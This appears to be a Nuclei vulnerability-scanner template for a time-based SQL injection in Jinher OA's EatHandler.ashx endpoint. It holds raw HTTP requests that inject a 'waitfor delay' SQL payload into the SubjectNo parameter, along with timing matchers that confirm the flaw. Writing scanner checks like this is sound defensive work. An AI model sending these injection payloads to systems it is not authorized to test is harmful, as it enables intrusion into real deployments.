id: jinher-jhsoft-eathandler-sqli
info:
  name: "金和OA EatHandler.ashx SQL注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 金和OA
  description: |
    金和OA EatHandler.ashx is vulnerable to SQL injection. This template checks for time-based SQL injection by leveraging `waitfor delay`.
http:
  - raw:
      - |
        GET /c6/JHSoft.Web.CostU8/EAI/EatHandler.ashx?SubjectNo=1'waitfor+delay%270:0:5%27--&State=code HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /c6/JHSoft.Web.CostU8/EAI/EatHandler.ashx?SubjectNo=1'waitfor+delay%270:0:8%27--&State=code HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "application/json"
      - type: word
        part: body
        words:
          - "[]"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
